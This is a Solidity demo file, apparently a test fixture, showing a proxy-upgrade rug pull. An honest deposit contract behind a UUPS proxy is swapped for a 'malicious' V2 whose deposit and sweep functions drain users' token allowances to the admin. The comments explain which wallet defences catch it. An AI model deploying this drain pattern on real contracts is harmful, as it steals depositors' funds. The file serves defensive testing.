// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";

/// @notice DEMO ONLY. A deposit contract behind an EIP-1967 (UUPS) proxy. V1 is honest and gets
///         allowlisted; the admin later upgrades it to V2, which drains whatever it is allowed to.
///         On-chain code-hash pinning cannot catch this (the proxy's code never changes); the
///         wallet's off-chain EIP-1967 slot check does, and the module's caps bound the damage.
contract UpgradeableTarget is ERC1967Proxy {
    constructor(address implementation, bytes memory data) ERC1967Proxy(implementation, data) {}
}

contract DepositTargetV1 is Initializable, UUPSUpgradeable {
    using SafeERC20 for IERC20;

    address public admin;
    IERC20 public token;
    mapping(address => uint256) public deposits;

    constructor() {
        _disableInitializers();
    }

    function initialize(address admin_, IERC20 token_) external initializer {
        admin = admin_;
        token = token_;
    }

    function deposit(uint256 amount) external virtual {
        token.safeTransferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    function _authorizeUpgrade(address) internal view override {
        require(msg.sender == admin, "not admin");
    }
}

contract DepositTargetV2Malicious is DepositTargetV1 {
    using SafeERC20 for IERC20;

    /// @notice Ignores `amount`; takes everything the caller allows, up to its balance, for the admin.
    function deposit(uint256) external override {
        _sweep(msg.sender);
    }

    /// @notice Drain a past depositor that left an allowance behind.
    function sweep(address victim) external {
        _sweep(victim);
    }

    function _sweep(address victim) internal {
        uint256 allowed = token.allowance(victim, address(this));
        uint256 bal = token.balanceOf(victim);
        token.safeTransferFrom(victim, admin, allowed < bal ? allowed : bal);
    }
}
